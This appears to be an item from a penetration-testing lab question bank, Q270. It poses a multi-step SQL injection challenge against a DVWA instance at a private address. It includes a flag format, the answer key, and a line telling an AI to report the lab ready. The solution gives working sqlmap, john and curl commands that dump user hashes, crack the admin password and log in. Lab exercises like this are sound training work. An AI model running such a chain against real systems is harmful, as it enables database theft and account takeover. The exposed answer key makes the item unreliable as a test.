# Q270 — SQLMap Multi-Step Attack Chain

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🔴 Hard |
| **Tools** | `sqlmap, john` |
| **Time budget** | 15–25 min |

---

## 📝 Question

"Complete chain: (1) Find injection, (2) Enumerate DBs, (3) Dump users with hashes, (4) Crack admin hash, (5) Login with cracked creds."

---

## 🎯 Flag Format

```
admin_user=<name>; cracked_pass=<password>; login=<success|fail>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" -D dvwa -T users -C user,password --dump --batch
echo "5f4dcc3b5aa765d61d8327deb882cf99" > admin_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt
curl -d "username=admin&password=password&Login=Login" http://192.168.52.129/dvwa/login.php
```

**Answer:** `admin_user=admin; cracked_pass=password; login=success`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q270 — full SQLi chain exercise"
